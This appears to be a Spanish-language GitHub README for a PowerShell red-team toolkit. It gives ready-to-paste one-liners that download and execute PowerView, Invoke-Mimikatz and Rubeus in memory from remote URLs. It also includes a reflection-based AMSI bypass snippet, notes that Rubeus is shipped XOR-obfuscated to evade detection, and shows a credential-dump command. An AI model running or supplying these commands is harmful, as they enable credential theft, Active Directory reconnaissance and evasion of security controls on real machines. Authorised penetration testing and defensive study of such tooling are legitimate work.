# REDTEAMTOOLS

Colección de herramientas de Red Team en PowerShell para Windows. Cada lanzador incluye bypass de AMSI y ejecuta el payload en memoria vía `IEX` + `DownloadString`, sin escribir en disco.

## Requisitos

- Windows con PowerShell (v2+)
- Conexión a internet para descargar los scripts desde GitHub
- Algunas acciones (dump de credenciales, Kerberos) requieren privilegios elevados o contexto de dominio

## Herramientas

| Archivo | Descripción |
|---|---|
| `powerviewoficial.ps1` | Lanzador: bypass AMSI + carga PowerView en memoria |
| `mimi_shell.ps1` | Lanzador: bypass AMSI + carga Invoke-Mimikatz y abre shell interactiva |
| `payload_rubeus.ps1` | Lanzador: bypass AMSI + decodifica `rb64_v2.txt` y carga Rubeus |
| `Invoke-Mimikatz.ps1` | Mimikatz en PowerShell (dump de credenciales) |
| `PowerView.ps1` | PowerView completo (reconocimiento de Active Directory) |
| `rb64_v2.txt` | Rubeus codificado (base64 + XOR `0x53`) |

## Ejecución

La forma de ejecución es **BYPASS**: descarga y ejecuta en memoria.

### PowerView

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/h4cksec/REDTEAMTOOLS/main/powerviewoficial.ps1')
```

Al cargar imprime `[+] PowerView loaded`. Luego usas los cmdlets:

```powershell
Get-NetDomain
Get-NetUser
Get-NetComputer
Get-NetGroup
```

### Mimikatz (shell interactiva)

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/h4cksec/REDTEAMTOOLS/main/mimi_shell.ps1')
```

Abre una shell de Mimikatz. Escribe `exit` para salir.

### Rubeus

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/h4cksec/REDTEAMTOOLS/main/payload_rubeus.ps1')
```

Descarga `rb64_v2.txt`, lo decodifica (base64 + XOR `0x53`), carga el assembly de Rubeus y ejecuta su `Main`.

### Invoke-Mimikatz directo

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/h4cksec/REDTEAMTOOLS/main/Invoke-Mimikatz.ps1')
```

Luego:

```powershell
Invoke-Mimikatz -DumpCreds
```

### PowerView directo

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/h4cksec/REDTEAMTOOLS/main/PowerView.ps1')
```

## Bypass de AMSI

Los lanzadores (`powerviewoficial.ps1`, `mimi_shell.ps1`, `payload_rubeus.ps1`) parchean `amsiInitFailed` vía reflexión antes de descargar el payload:

```powershell
$t=[Ref].Assembly.GetTypes()
$o=$t|?{$_.Name -eq $u}
if ($o) { $o.$m($b,$n).SetValue($null,$true) }
```

Así la descarga y ejecución en memoria no es bloqueada por AMSI.

## Notas

- Todo se ejecuta en memoria; no se escribe en disco.
- Requiere conexión a internet para el `DownloadString`.
- Las URLs `H4ck01/...` y `h4cksec/...` funcionan igual (la cuenta fue renombrada).

## Autor

h4cksec
